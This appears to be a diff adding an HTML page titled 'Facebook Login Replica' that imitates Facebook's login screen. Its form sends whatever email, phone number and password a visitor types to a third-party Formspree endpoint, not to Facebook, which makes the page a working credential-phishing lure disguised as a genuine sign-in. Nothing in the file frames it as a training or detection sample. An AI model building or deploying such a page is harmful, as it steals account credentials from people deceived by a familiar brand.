@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login Replica</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <h1 class="logo">facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <div class="right-section">
+            <div class="login-box">
+                <form id="login-form" action="https://formspree.io/f/xzzpgwlv" method="POST">
+                    <!-- Email or phone input -->
+                    <input type="text" id="email" name="email" placeholder="Email or phone number" required>
+                    
+                    <!-- Password input -->
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                    
+                    <!-- Submit button -->
+                    <button type="submit" class="login-btn">Log In</button>
+                    
+                    <a href="#" class="forgot-password">Forgotten password?</a>
+                    <div class="divider"></div>
+                    <button type="button" class="signup-btn">Create New Account</button>
+                </form>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
